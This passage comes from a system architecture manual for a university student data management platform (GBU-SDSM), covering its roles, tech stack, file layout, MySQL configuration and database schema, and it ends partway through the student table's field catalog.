# GAUTAM BUDDHA UNIVERSITY - STUDENT DATA MANAGEMENT SYSTEM (GBU-SDSM)
## COMPLETE SYSTEM ARCHITECTURE, CODEBASE SPECIFICATION & TECHNICAL ENCYCLOPEDIA
### Comprehensive Reference Manual for AI Autonomous Agents & Senior Engineering Teams

---

# TABLE OF CONTENTS
1. [SECTION 1: Executive System Overview & Architectural Paradigm](#section-1-executive-system-overview--architectural-paradigm)
   - 1.1 Executive System Summary & Mission
   - 1.2 Multi-Role Enterprise Architecture Overview
   - 1.3 Technology Stack Catalog & Dependency Matrix
   - 1.4 High-Level Architecture & Communication Topology
   - 1.5 Master Directory Hierarchy & File Map
2. [SECTION 2: Relational Database Architecture & Complete Data Dictionary](#section-2-relational-database-architecture--complete-data-dictionary)
   - 2.1 Database Engine, Dialect & Connection Pooling
   - 2.2 Entity Relationship Diagram (ERD) & Foreign Key Constraints
   - 2.3 Detailed Field-by-Field Schema Catalog (All 17 Models)
     - 2.3.1 User Model (`users`)
     - 2.3.2 Student Model (`students`)
     - 2.3.3 Coordinator Model (`coordinators`)
     - 2.3.4 Chairperson Model (`chairpersons`)
     - 2.3.5 ChairpersonClass Model (`chairperson_classes`)
     - 2.3.6 Faculty Model (`faculty`)
     - 2.3.7 FacultyAssignment Model (`faculty_assignments`)
     - 2.3.8 Subject Model (`subjects`)
     - 2.3.9 AttendanceSession Model (`attendance_sessions`)
     - 2.3.10 AttendanceRecord Model (`attendance_records`)
     - 2.3.11 Timetable Model (`timetables`)
     - 2.3.12 TimetableSection Model (`timetable_sections`)
     - 2.3.13 Specialization Model (`specializations`)
     - 2.3.14 Message Model (`messages`)
     - 2.3.15 MessageRecipient Model (`message_recipients`)
     - 2.3.16 ChangeLog Model (`change_logs`)
     - 2.3.17 Notification Model (`notifications`)
   - 2.4 Model Associations, Cascade Rules & Lifecycle Hooks
3. [SECTION 3: Authentication, Authorization, Cryptography & Security Infrastructure](#section-3-authentication-authorization-cryptography--security-infrastructure)
   - 3.1 Dual-Token JWT Cryptographic Authentication Engine
   - 3.2 Password Hashing, Salting & OTP Generation
   - 3.3 Role-Based Access Control (RBAC) Permission Matrix
   - 3.4 Middleware Interception Pipeline
   - 3.5 Security Hardening, Content Security Policy & CORS Engine
4. [SECTION 4: Exhaustive Backend API Specification & Controller Internals](#section-4-exhaustive-backend-api-specification--controller-internals)
   - 4.1 Authentication API Router (`/auth`)
   - 4.2 Student Data Management API Router (`/admin`)
   - 4.3 Coordinator Management & Dashboard API Router (`/coordinator`, `/admin`)
   - 4.4 Chairperson Oversight API Router (`/chairperson`)
   - 4.5 Faculty & Teaching Attendance API Router (`/faculty`, `/teaching`)
   - 4.6 University Attendance Telemetry API Router (`/attendance`)
   - 4.7 Internal Messaging & Broadcast API Router (`/messages`)
   - 4.8 Specialization & Department Hierarchy API Router (`/admin`)
   - 4.9 Timetable Administration API Router (`/timetable`)
5. [SECTION 5: Frontend Single-Page Application (SPA) Architecture](#section-5-frontend-single-page-application-spa-architecture)
   - 5.1 React 18, Vite & TypeScript Ecosystem Integration
   - 5.2 Application Bootstrap Lifecycle (`index.html`, `main.tsx`, `App.tsx`)
   - 5.3 Client-Side Routing Tree & Route Guard Protection
   - 5.4 Redux Toolkit Global State Store Architecture
   - 5.5 Axios Network Client Interceptors & Token Synchronization
6. [SECTION 6: Frontend Pages Encyclopedia & View Logic](#section-6-frontend-pages-encyclopedia--view-logic)
   - 6.1 Administrator Views (`src/pages/Admin/`)
   - 6.2 Coordinator Views (`src/pages/Coordinator/`)
   - 6.3 Chairperson Views (`src/pages/Chairperson/`)
   - 6.4 Faculty Views (`src/pages/Faculty/`, `src/pages/Teaching/`)
   - 6.5 Student Portal Views (`src/pages/Client/`, `src/pages/Student/`)
   - 6.6 Public & Authentication Views (`src/pages/Landing/`)
7. [SECTION 7: Frontend Reusable Component Deep Dive](#section-7-frontend-reusable-component-deep-dive)
   - 7.1 Administrative Navigation & Header Framework
   - 7.2 Student Data Editing & Detailed Profiles
   - 7.3 Attendance Roster Tables, Session Cards & Visual Analytics
   - 7.4 Multi-Class Real-Time Messaging Center
   - 7.5 Home & Landing Component Framework
   - 7.6 Error Boundary & PWA Support Infrastructure
8. [SECTION 8: End-to-End Business Workflows & Execution Algorithms](#section-8-end-to-end-business-workflows--execution-algorithms)
   - 8.1 Student Enrollment & Registration Workflow
   - 8.2 Excel File Ingestion, Parsing & AI-Assisted Reformatting
   - 8.3 Class Bulk Details Modification Engine
   - 8.4 Teaching Roster Retrieval, Attendance Marking & Session Locking
   - 8.5 Student Attendance Aggregation & Debarment Prediction Algorithm
   - 8.6 Faculty Class-Subject Assignment & Allocation Verification
   - 8.7 Targeted Multi-Class In-App Broadcast Messaging
   - 8.8 Coordinator Class Boundary Isolation Algorithm
   - 8.9 ChangeLog Audit Trail & Notification Engine
9. [SECTION 9: TypeScript Type System, Interfaces & Domain Constants](#section-9-typescript-type-system-interfaces--domain-constants)
   - 9.1 Complete TypeScript Interfaces (`types.ts`)
   - 9.2 Domain Constants, Enums & Academic Rules (`constants/index.ts`)
   - 9.3 Regular Expressions & Data Normalization Utilities
10. [SECTION 10: DevOps, Deployment, MySQL Performance Tuning & System Evolution](#section-10-devops-deployment-mysql-performance-tuning--system-evolution)
    - 10.1 Environment Variables & Configuration Blueprint
    - 10.2 MySQL Session Optimization & InnoDB Buffer Pool Configuration
    - 10.3 Process Management, Signal Handling & Graceful Termination
    - 10.4 Vite Build Optimizations, Code Splitting & Chunking
    - 10.5 Historical Bug Fixes & Architectural Evolution
    - 10.6 AI Agent Reference Manual & Developer Maintenance Guide

---

# SECTION 1: EXECUTIVE SYSTEM OVERVIEW & ARCHITECTURAL PARADIGM

## 1.1 Executive System Summary & Mission
The Gautam Buddha University Student Data Management System (GBU-SDSM) is a comprehensive, institutional-grade academic data platform engineered specifically to unify, digitize, and automate the academic administration lifecycle across undergraduate, postgraduate, and doctoral degree programs. Higher educational institutions operate under multi-tiered organizational hierarchies—comprising university administrators, school deans (chairpersons), departmental program coordinators, teaching faculty members, and student bodies. Prior to GBU-SDSM, universities typically struggled with fragmented administrative silos: spreadsheets maintained by individual instructors, attendance tracked on physical paper registers with high risk of proxy entries, disparate records between student affairs and finance, lack of audit trails for student detail alterations, and cumbersome manual processes for assigning faculty to class cohorts.

GBU-SDSM establishes a centralized, real-time single source of truth across the university. The system provides:
1. **Unified Identity & Role-Based Access Control**: Centralized authentication for five distinct roles: `admin`, `coordinator`, `chairperson`, `faculty`, and `student`.
2. **Comprehensive Student Record Management**: Tracking of personal details, demographic categorization, parent/guardian contacts, hostel boarding status, admission types, 12th-grade academic prerequisites, semester registrations across multi-year curricula, year-wise CGPA records, photo management, and professional career telemetry (internships and corporate campus placements).
3. **Automated Batch Roster Ingestion & Reformatting**: Robust ingestion of Microsoft Excel (`.xlsx`, `.xls`) spreadsheets with an intelligent algorithmic reformatting engine capable of recognizing arbitrary header aliases, resolving messy student data into uniform database records, and bulk-processing thousands of students in seconds.
4. **Fine-Grained Class & Coordinator Scoping**: Automated class discovery and scoping based on a five-tuple composite class key: `School` > `Department` > `Program` > `Batch` > `Specialization`. Coordinators are restricted by strict authorization boundaries to only access students and classes assigned directly to them.
5. **Real-Time Faculty Attendance Marking & Tamper-Proof Locking**: Interactive digital rosters for faculty to mark attendance on daily schedules. Submitted attendance sessions are cryptographically locked against subsequent unauthorized alteration, with audit logs capturing every administrative modification.
6. **Student Portal & Attendance Telemetry**: Instantaneous visibility for students into their course enrollments, subject-wise attendance statistics (total lectures, lectures present, lectures absent, excused leaves, and attendance percentage), daily attendance history, academic timetables, and notifications.
7. **Institutional In-App Messaging**: Targeted messaging infrastructure enabling university administrators, chairpersons, coordinators, and faculty to broadcast messages to entire classes, individual students, or specific administrative groups with unread message badges and audit trails.

## 1.2 Multi-Role Enterprise Architecture Overview
The architecture is structured around five principal organizational actors:

### 1. University Administrator (`admin`)
- Possesses global superuser privileges across all schools, departments, and programs.
- Can create, update, deactivate, and delete student records across any academic unit.
- Manages institutional coordinators, assigning them specific programs, batches, and classes.
- Designates school chairpersons and oversees global institutional telemetry.
- Uploads bulk student rosters via raw or reformatted Excel workbooks.
- Manages university faculty members, creates faculty credentials, and assigns faculty to teach specific subjects within specific classes.
- Configures academic timetables, subject master catalogs, and specializations.
- Holds administrative power to audit, inspect, and amend locked attendance records across the entire institution.

### 2. Academic Coordinator (`coordinator`)
- Operates under strict departmental and class assignment boundaries.
- Oversees specific classes (e.g., SOICT > CSE > B.Tech > 2025-29 > Artificial Intelligence).
- Registers individual students into assigned classes or ingests departmental Excel rosters.
- Performs bulk operations (e.g., updating hosteller status, semester registrations, internship company, DOJ, DOE, and placement status) for cohorts within their assigned classes.
- Communicates directly with students in their assigned classes via the messaging system.
- Can be assigned teaching duties, enabling dual functionality as a teaching instructor who marks attendance for their assigned subjects.
- Monitored by administrative change logs: every modification made by a coordinator generates an immutable log entry and alert for university administrators.

### 3. School Chairperson (`chairperson`)
- Executive dean level overseeing all departments, programs, batches, and coordinators within an entire school (e.g., School of Information and Communication Technology - SOICT).
- Monitors class progress, student enrollment figures, and coordinator assignments across the school.
- Accesses audit logs and change histories for all coordinators within their jurisdiction.
- Broadcasts notices and messages to students, coordinators, or faculty across the school.
- Reviews attendance performance across courses and subjects to ensure regulatory compliance.

### 4. Teaching Faculty (`faculty`)
- Dedicated instructor role focused on classroom execution, lecture schedules, and attendance.
- Accesses a personalized Teaching Dashboard showing all assigned classes and subjects for the current semester.
- Conducts attendance sessions with an interactive digital roster featuring student photos, roll numbers, names, and fast one-click toggles (Present / Absent / Excused).
- Submits attendance sessions which automatically lock to prevent proxy modifications.
- Communicates with students enrolled in their classes through targeted messaging.
- Maintains their personal faculty profile, academic credentials, and contact information.

### 5. Enrolled Student (`student`)
- End-user academic constituent accessing their personalized Student Dashboard.
- Reviews comprehensive personal, academic, admission, and contact information on file.
- Inspects real-time attendance analytics: overall university attendance percentage, subject-by-subject attendance breakdowns with color-coded warning thresholds (green for >=75%, amber for 65-74%, red for <65%), and recent session logs.
- Views class weekly timetables, lecture rooms, and subject schedules.
- Receives broadcast notices and direct communications from teachers, coordinators, chairpersons, and university administrators.

## 1.3 Technology Stack Catalog & Dependency Matrix

The application leverages battle-tested modern web engineering tools:

| Tier | Technology | Version | Purpose & Strategic Rationale |
| :--- | :--- | :--- | :--- |
| **Backend Runtime** | Node.js | v18+ / v20+ / v24+ | Event-driven, non-blocking I/O runtime optimal for concurrent API requests. |
| **Web Framework** | Express.js | 4.19.2 | Minimalist HTTP web framework providing robust middleware chaining and routing. |
| **Database Engine** | MySQL | 8.0+ | ACID-compliant relational persistence engine with robust transactional capabilities. |
| **ORM Framework** | Sequelize | 6.37.3 | Promise-based Node.js ORM providing schema modeling, migrations, and query generation. |
| **Authentication** | jsonwebtoken | 9.0.2 | Cryptographic signing and verification of stateless access and refresh tokens. |
| **Password Hashing**| bcryptjs | 2.4.3 | Adaptive, work-factor salted hashing protecting user passwords in the database. |
| **Spreadsheet Parsing**| xlsx (SheetJS) | 0.18.5 | High-speed binary parsing and synthesis of Microsoft Excel workbooks. |
| **File Multipart** | multer | 1.4.5-lts.1 | In-memory stream parser handling Excel file uploads and photo uploads. |
| **Logging** | Custom Structured Logger | Internal | Thread-safe, high-speed asynchronous logging with ISO formatting and file retention. |
| **Process Control** | Process Event Handlers | Native | Graceful teardown listeners for SIGINT, SIGTERM, and unhandled promise rejections. |
| **Frontend Framework**| React | 18.3.1 | Declarative component-driven UI library with Concurrent Mode and React Hooks. |
| **Frontend Language** | TypeScript | 5.4.5 | Static type safety preventing runtime null pointer and schema mismatch bugs. |
| **Bundler & Tooling** | Vite | 7.3.6 | Blazing fast development server with ESBuild and optimized Rollup production bundler. |
| **Client Routing** | React Router DOM | 6.23.1 | Declarative client-side routing with nested layouts and protected route wrappers. |
| **State Management**| Redux Toolkit | 2.2.5 | Predictable, centralized application state container with Immer-powered immutable updates. |
| **React Redux Bindings**| react-redux | 9.1.2 | Official React bindings for Redux store subscriptions and dispatch hooks. |
| **HTTP Client** | Axios | 1.6.8 | Promise-based HTTP client with automatic request/response interceptors. |
| **Styling Framework**| Tailwind CSS | 3.4.3 | Utility-first CSS framework providing rapid, responsive, design-system-aligned UI. |
| **Vector Icons** | Lucide React | 0.378.0 | Consistent, modern vector iconography covering all domain entities and actions. |
| **Notifications** | Sonner | 1.4.41 | High-performance, stacked toast notification system with interactive loading states. |
| **Animations** | Framer Motion | 11.1.9 | Hardware-accelerated UI animations for modals, transitions, and collapsible panels. |
| **Data Visualization**| Recharts | 2.12.7 | Declarative SVG-based charting library for attendance statistics and performance gauges. |

## 1.4 High-Level Architecture & Communication Topology

The following diagram illustrates the complete architectural topology of the GBU-SDSM ecosystem, showing network pathways, security checkpoints, controller delegation, and database persistence:

```mermaid
flowchart TB
    subgraph ClientBrowser [Client Browser Tier - React 18 SPA]
        ReactUI[React Virtual DOM & Tailwind UI]
        Router[React Router DOM v6 - Protected Routes]
        ReduxStore[Redux Toolkit Store: adminSlice, userSlice]
        AxiosClient[Axios Client with Bearer Token Interceptor]
    end

    subgraph SecurityPerimeter [Security Perimeter & HTTP Gateway]
        CORS[CORS Whitelist Validator]
        SecHeaders[Security Headers - CSP, XSS, FrameGuard]
        ReqLogger[Request Logger & Timing Profiler]
        RateLimiter[IP Rate Limiter]
    end

    subgraph MiddlewareTier [Express Middleware Pipeline]
        AuthMiddleware[auth.middleware: JWT Verification & User Hydration]
        RoleMiddleware[role.middleware: RBAC Permission Guard]
        MulterMiddleware[multer: Memory Buffer & MIME Type Validator]
    end

    subgraph ControllerTier [Backend Controller Orchestrators]
        AuthCtrl[auth.controller.js]
        StudentCtrl[student.controller.js]
        CoordCtrl[coordinator.controller.js]
        ChairCtrl[chairperson.controller.js]
        FacultyCtrl[faculty.controller.js]
        TeachingCtrl[teaching.controller.js]
        AttendCtrl[attendance.controller.js]
        MsgCtrl[messages.controller.js]
        ExcelCtrl[excel.controller.js]
        TimetableCtrl[timetable.controller.js]
    end

    subgraph ServiceTier [Pure Functional Domain Services]
        TokenSvc[token.service.js: Access & Refresh Tokens]
        HashSvc[hashing.service.js: Salted Bcrypt]
        UploadSvc[upload.service.js: Excel Student Ingestion]
        ReformatSvc[excelReformat.service.js: Header Mapping]
        PhotoSvc[photoUpload.service.js: Photo Data Resolution]
    end

    subgraph PersistenceTier [Relational Database Tier - MySQL 8.x]
        SequelizeORM[Sequelize ORM Engine]
        TableUsers[(users)]
        TableStudents[(students)]
        TableCoord[(coordinators)]
        TableChair[(chairpersons)]
        TableFaculty[(faculty)]
        TableFacAssign[(faculty_assignments)]
        TableSubjects[(subjects)]
        TableSessions[(attendance_sessions)]
        TableRecords[(attendance_records)]
        TableTimetables[(timetables)]
        TableMessages[(messages & message_recipients)]
        TableLogs[(change_logs & notifications)]
    end

    ClientBrowser -->|HTTPS REST JSON Requests| SecurityPerimeter
    SecurityPerimeter --> MiddlewareTier
    MiddlewareTier --> ControllerTier
    ControllerTier --> ServiceTier
    ControllerTier --> SequelizeORM
    ServiceTier --> SequelizeORM
    SequelizeORM --> PersistenceTier
```

## 1.5 Master Directory Hierarchy & File Map

The complete codebase file tree comprises 272 total files, with the primary application logic encapsulated within the `backend/` and `frontend/` directories.

### Master File Map
```
sdms-main/
├── backend/
│   ├── controllers/
│   │   ├── attendance.controller.js    # Student attendance summaries, admin audits, record edits
│   │   ├── auth.controller.js          # Authentication, JWT lifecycle, password resets, registration
│   │   ├── chairperson.controller.js   # Chairperson oversight, class delegations, change logs
│   │   ├── coordinator.controller.js   # Coordinator assignments, dashboard metrics, student counts
│   │   ├── excel.controller.js         # Excel file ingestion, column reformatting, photo uploads
│   │   ├── faculty.controller.js       # Faculty profile management, assignments, directory
│   │   ├── messages.controller.js      # Multi-class broadcasts, thread histories, unread badges
│   │   ├── specialization.controller.js# Specialization catalog, school/department hierarchy
│   │   ├── student.controller.js       # Student CRUD, bulk updates, filtering, Excel uploads
│   │   ├── teaching.controller.js      # Faculty roster generation, attendance session submission
│   │   └── timetable.controller.js     # Timetable scheduling, room allocations, section schedules
│   ├── lib/
│   │   ├── asyncHandler.js             # Higher-order wrapper catching async errors
│   │   ├── db.js                       # Sequelize MySQL connection pool & buffer tuning
│   │   ├── errorHandler.js             # Centralized HTTP error formatter and logger
│   │   ├── logger.js                   # Asynchronous structured file & console logging
│   │   ├── requestLogger.js            # Express request timing and IP profiler
│   │   ├── security.js                 # Security headers injection (CSP, FrameGuard, HSTS)
│   │   └── shutdown.js                 # Process signal listener for graceful pool shutdown
│   ├── middlewares/
│   │   ├── auth.middleware.js          # JWT extraction, signature verification, user injection
│   │   ├── rateLimit.middleware.js     # In-memory IP request rate limiting
│   │   └── role.middleware.js          # Strict RBAC permission verification
│   ├── models/
│   │   ├── attendanceRecord.model.js   # Granular student session status (Present/Absent/Excused)
│   │   ├── attendanceSession.model.js  # Scheduled attendance event with lock status
│   │   ├── chairperson.model.js        # Chairperson executive profile
│   │   ├── chairpersonClass.model.js   # Mapping table for chairperson-class delegations
│   │   ├── changeLog.model.js          # Immutable audit log with before/after diffs
│   │   ├── coordinator.model.js        # Coordinator profile with program assignments
│   │   ├── faculty.model.js            # Faculty instructor profile
│   │   ├── facultyAssignment.model.js  # Class-Subject-Teacher relational binding
│   │   ├── index.js                    # Model registry & foreign key association definition
│   │   ├── message.model.js            # Message entity with sender and broadcast payload
│   │   ├── messageRecipient.model.js   # Junction mapping message delivery and read receipts
│   │   ├── notification.model.js       # Role-targeted institutional system notifications
│   │   ├── specialization.model.js     # Academic specialization catalog
│   │   ├── student.model.js            # Comprehensive student entity (42 fields)
│   │   ├── subject.model.js            # Curriculum subject master catalog
│   │   ├── timetable.model.js          # Timetable root configuration
│   │   ├── timetableSection.model.js   # Timetable section schedule grid
│   │   └── user.model.js               # Universal authentication credentials & role flags
│   ├── routes/
│   │   ├── attendance.route.js         # Endpoints for attendance rosters and sessions
│   │   ├── auth.route.js               # Endpoints for login, refresh, logout, OTP
│   │   ├── chairperson.route.js        # Endpoints for chairperson oversight and classes
│   │   ├── coordinator.route.js        # Endpoints for coordinator management and classes
│   │   ├── faculty.route.js            # Endpoints for faculty administration and directory
│   │   ├── messages.route.js           # Endpoints for in-app messaging and broadcasts
│   │   ├── specialization.route.js     # Endpoints for academic specializations
│   │   ├── student.route.js            # Endpoints for student CRUD and bulk edits
│   │   └── timetable.route.js          # Endpoints for timetable schedule management
│   ├── services/
│   │   ├── excelReformat.service.js    # Algorithmic header alias matching & workbook reformatting
│   │   ├── hashing.service.js          # Salted bcrypt hashing and verification
│   │   ├── otp.service.js              # Six-digit cryptographic OTP generator
│   │   ├── parsing.service.js          # Type-safe payload sanitization and parsing
│   │   ├── photoUpload.service.js      # Student photo resolution (Base64, URL, filesystem)
│   │   ├── timetable.service.js        # Timetable slot conflict detection engine
│   │   ├── token.service.js            # JWT access and refresh token signing & verification
│   │   ├── upload.service.js           # Excel student batch normalization
│   │   └── whitespace.service.js       # String normalization and whitespace removal
│   ├── index.js                        # Server initialization, DB bootstrap & port listener
│   ├── server.js                       # Express configuration, CORS, middleware assembly
│   └── package.json                    # Backend dependencies and execution scripts
├── frontend/
│   ├── src/
│   │   ├── assets/                     # Static brand assets, logos, and developer portraits
│   │   ├── components/
│   │   │   ├── Admin/                  # Admin headers, sidebars, student forms, student details
│   │   │   ├── Attendance/             # Attendance roster tables, summary cards, SVG charts
│   │   │   ├── Client/                 # Student profile view, attendance view, messages, timetable
│   │   │   ├── Home/                   # Public landing components: Hero, About, Team, Statistics
│   │   │   ├── Messages/               # Full-screen responsive messaging center
│   │   │   ├── Teaching/               # Faculty teaching class cards and status badges
│   │   │   └── AppErrorBoundary.tsx    # Global React component crash boundary
│   │   ├── constants/
│   │   │   └── index.ts                # University schools, departments, initial forms, team data
│   │   ├── context/
│   │   │   ├── app/store.ts            # Redux Toolkit global store configuration
│   │   │   ├── features/adminSlice.ts  # Administrative user profile & authentication slice
│   │   │   ├── features/userSlice.ts   # Student profile state slice
│   │   │   └── useAuth.ts              # Custom React hook for authentication state
│   │   ├── lib/
│   │   │   ├── api.ts                  # Axios instance with global interceptors
│   │   │   ├── attendance.api.ts       # Attendance roster and session API methods
│   │   │   ├── messages.api.ts         # In-app messaging and recipient lookup API methods
│   │   │   ├── teaching.api.ts         # Faculty teaching classes and submission API methods
│   │   │   └── user.api.ts             # Student, coordinator, chairperson CRUD API methods
│   │   ├── pages/
│   │   │   ├── Admin/                  # Admin & coordinator pages (Dashboard, Classes, Records, etc.)
│   │   │   ├── Chairperson/            # Chairperson oversight pages (Classes, Records, Logs, etc.)
│   │   │   ├── Client/                 # Student portal dashboard page
│   │   │   ├── Faculty/                # Faculty profile and messages pages
│   │   │   ├── Landing/                # Public Landing, Login, Signup, Developer showcase
│   │   │   ├── Student/                # Student attendance standalone page
│   │   │   └── Teaching/               # Teaching Dashboard and Mark Attendance pages
│   │   ├── types/
│   │   │   └── types.ts                # Master TypeScript interface and type declarations
│   │   ├── utils/
│   │   │   ├── Dropdown.tsx            # Custom accessible dropdown component
│   │   │   ├── ProtectedRoute.tsx      # Route authentication and role redirection guard
│   │   │   ├── excel.ts                # Client-side Excel export generator
│   │   │   └── NotFound.tsx            # 404 Not Found fallback view
│   │   ├── App.tsx                     # Master React Router DOM hierarchy & route manifest
│   │   ├── index.css                   # Tailwind CSS imports and custom utility styles
│   │   └── main.tsx                    # React DOM entry point wrapped in Redux Provider
│   ├── index.html                      # HTML5 shell
│   ├── package.json                    # Frontend dependencies and build scripts
│   ├── tsconfig.json                   # TypeScript compiler configuration
│   └── vite.config.ts                  # Vite build tool and development server configuration


# SECTION 2: RELATIONAL DATABASE ARCHITECTURE & COMPLETE DATA DICTIONARY

## 2.1 Database Engine, Dialect & Connection Pooling
The GBU-SDSM persistence tier relies on MySQL 8.x executing with the InnoDB storage engine to guarantee full Atomicity, Consistency, Isolation, and Durability (ACID) compliance across all multi-row and multi-table operations. The database interface is managed via Sequelize ORM (`v6.37.3`), configured in `backend/lib/db.js`.

### Connection Configuration & Session Optimization
The backend initializes a pooled database connection with dynamic environment fallback and performance tuning:
- **Host & Port**: Configurable via `DB_HOST` (default `localhost`) and `DB_PORT` (default `3306`).
- **Database Name**: `gbu_sdms` (configured via `DB_NAME`).
- **Character Encoding**: `utf8mb4` character set with `utf8mb4_unicode_ci` collation, ensuring full support for multilingual characters, diacritics, and symbols.
- **Connection Pool Parameters**:
  - `max: 25`: Maximum concurrent active connections in the pool.
  - `min: 4`: Minimum idle connections preserved to prevent cold-start latency.
  - `acquire: 30000`: Maximum timeout in milliseconds before throwing a connection acquisition error.
  - `idle: 30000`: Maximum idle time before an unused connection is terminated.
- **Session Memory Tuning (MySQL Specific)**:
  On every successful connection establishment, the backend executes session-level memory configuration queries:
  1. `SET SESSION sort_buffer_size = 4 * 1024 * 1024;` (4MB sort buffer, optimizing sorting operations during large class student roster queries).
  2. `SET SESSION tmp_table_size = 64 * 1024 * 1024;` (64MB memory table size, preventing in-memory joins from spilling to disk).
  3. `SET SESSION max_heap_table_size = 64 * 1024 * 1024;` (64MB maximum heap table size, aligning with `tmp_table_size`).

## 2.2 Entity Relationship Diagram (ERD)

The following Mermaid ERD visualizes the structural associations and foreign key constraints between all database entities:

```mermaid
erDiagram
    USERS ||--o| STUDENTS : "authenticates (userId)"
    USERS ||--o| COORDINATORS : "acts_as (userId)"
    USERS ||--o| CHAIRPERSONS : "acts_as (userId)"
    USERS ||--o| FACULTY : "acts_as (userId)"
    USERS ||--o{ MESSAGES : "sends (senderId)"
    USERS ||--o{ MESSAGE_RECIPIENTS : "receives (recipientId)"
    USERS ||--o{ CHANGE_LOGS : "logs_action (userId)"

    COORDINATORS ||--o{ STUDENTS : "manages_assigned_classes"
    CHAIRPERSONS ||--o{ CHAIRPERSON_CLASSES : "delegated_to (chairpersonId)"

    FACULTY ||--o{ FACULTY_ASSIGNMENTS : "assigned_to (facultyId)"
    SUBJECTS ||--o{ FACULTY_ASSIGNMENTS : "taught_as (subjectId)"

    FACULTY ||--o{ ATTENDANCE_SESSIONS : "conducts (teacherId)"
    SUBJECTS ||--o{ ATTENDANCE_SESSIONS : "session_for (subjectId)"
    ATTENDANCE_SESSIONS ||--|{ ATTENDANCE_RECORDS : "contains (sessionId)"
    STUDENTS ||--o{ ATTENDANCE_RECORDS : "marked_in (studentId)"

    MESSAGES ||--|{ MESSAGE_RECIPIENTS : "delivers_to (messageId)"
    TIMETABLES ||--|{ TIMETABLE_SECTIONS : "divides_into (timetableId)"

    USERS {
        int id PK
        string username UK
        string email UK
        string password
        string role
        string resetOtp
        datetime otpExpires
        datetime createdAt
        datetime updatedAt
    }

    STUDENTS {
        int id PK
        int userId FK
        string rollNo UK
        string enrollmentNo UK
        string fullName
        string school
        string department
        string program
        string batch
        string specialization
        string fatherName
        string motherName
        string gender
        date dob
        string category
        string nationalId
        string mobile
        string email
        text address
        string hosteller
        string enrollmentStatus
        string admissionType
        string twelfthCompartment
        string admissionYear
        json semesters
        json yearCGPA
        string internshipStatus
        string internshipCompany
        string internshipDOJ
        string internshipDOE
        string internshipType
        string placementStatus
        string placementCompany
        string placementDOJ
        string placementDOE
        string placementType
        longtext photo
        enum status
        int createdBy FK
        int updatedBy FK
        datetime createdAt
        datetime updatedAt
    }

    COORDINATORS {
        int id PK
        int userId FK
        string name
        string email UK
        string phone
        string school
        string department
        string program
        string batch
        string specialization
        datetime createdAt
        datetime updatedAt
    }

    CHAIRPERSONS {
        int id PK
        int userId FK
        string name
        string email UK
        string phone
        string school
        datetime createdAt
        datetime updatedAt
    }

    CHAIRPERSON_CLASSES {
        int id PK
        int chairpersonId FK
        string school
        string department
        string program
        string batch
        string specialization
        datetime createdAt
        datetime updatedAt
    }

    FACULTY {
        int id PK
        int userId FK
        string name
        string email UK
        string phone
        string department
        string designation
        string qualifications
        datetime createdAt
        datetime updatedAt
    }

    FACULTY_ASSIGNMENTS {
        int id PK
        int facultyId FK
        int subjectId FK
        string school
        string department
        string program
        string batch
        string specialization
        string academicYear
        int semester
        datetime createdAt
        datetime updatedAt
    }

    SUBJECTS {
        int id PK
        string code UK
        string name
        string department
        int semester
        int credits
        string type
        datetime createdAt
        datetime updatedAt
    }

    ATTENDANCE_SESSIONS {
        int id PK
        int teacherId FK
        int subjectId FK
        string classKey
        date date
        string slot
        string room
        boolean isLocked
        datetime lockedAt
        int lockedBy FK
        datetime createdAt
        datetime updatedAt
    }

    ATTENDANCE_RECORDS {
        int id PK
        int sessionId FK
        int studentId FK
        string rollNo
        enum status
        text remarks
        datetime createdAt
        datetime updatedAt
    }

    MESSAGES {
        int id PK
        int senderId FK
        string title
        text content
        enum targetType
        string targetClass
        datetime createdAt
        datetime updatedAt
    }

    MESSAGE_RECIPIENTS {
        int id PK
        int messageId FK
        int recipientId FK
        boolean isRead
        datetime readAt
        datetime createdAt
        datetime updatedAt
    }

    CHANGE_LOGS {
        int id PK
        int userId FK
        string action
        string entity
        string entityId
        json details
        datetime createdAt
        datetime updatedAt
    }

    NOTIFICATIONS {
        int id PK
        string toRole
        int toUserId FK
        string message
        json data
        boolean isRead
        datetime createdAt
        datetime updatedAt
    }
```

---

## 2.3 Detailed Field-by-Field Schema Catalog (All 17 Models)

### 2.3.1 User Model (`users`)
- **Source File**: `backend/models/user.model.js`
- **Database Table**: `users`
- **Description**: Stores primary credentials, authentication metadata, and role assignments for all institutional actors.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Unique internal numeric user identifier.
  2. `username` (VARCHAR(255), Unique, Nullable): Unique user handle. For students, this matches their Roll Number; for faculty/coordinators, it is their system identifier or institutional email prefix.
  3. `email` (VARCHAR(255), Unique, NOT NULL): Institutional email address. Validated against standard email format regex. Used as the primary login credential for administrators, chairpersons, coordinators, and faculty.
  4. `password` (VARCHAR(255), NOT NULL): Cryptographically hashed password generated via `bcryptjs` with a minimum cost factor of 10. Raw plain-text passwords are never persisted.
  5. `role` (ENUM('admin', 'coordinator', 'chairperson', 'faculty', 'student'), NOT NULL, Default: 'student'): Governs the authorization level and permission boundaries of the authenticated session.
  6. `resetOtp` (VARCHAR(255), Nullable): 6-digit numeric one-time passcode generated during forgotten password recovery procedures.
  7. `otpExpires` (DATETIME, Nullable): UTC expiration timestamp for `resetOtp` (typically 10 minutes from issuance).
  8. `createdAt` (DATETIME, NOT NULL): Automatic timestamp of account creation.
  9. `updatedAt` (DATETIME, NOT NULL): Automatic timestamp of last record alteration.

### 2.3.2 Student Model (`students`)
- **Source File**: `backend/models/student.model.js`
- **Database Table**: `students`
- **Description**: Central student record holding personal demographics, academic enrollment details, semester progression, CGPA performance, hostel boarding status, photo storage, and professional career telemetry.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Unique internal student database identifier.
  2. `userId` (INTEGER, Foreign Key -> `users.id`, Nullable): Relational link to the student's User authentication account. Allows login to the Student Portal.
  3. `rollNo` (VARCHAR(255), Unique, NOT NULL): Institutional academic Roll Number (e.g., `255ucs258`). Stored in lowercase normalized format with all whitespace removed. Serves as the primary public identifier.
  4. `enrollmentNo` (VARCHAR(255), Unique, NOT NULL): University registration/enrollment number (e.g., `2500100481`). Stored normalized in lowercase.
  5. `fullName` (VARCHAR(255), NOT NULL): Student's official legal name as registered with the university.
  6. `school` (VARCHAR(255), NOT NULL): Academic school code (e.g., `soict` for School of Information and Communication Technology).
  7. `department` (VARCHAR(255), NOT NULL): Academic department code (e.g., `cse` for Computer Science & Engineering).
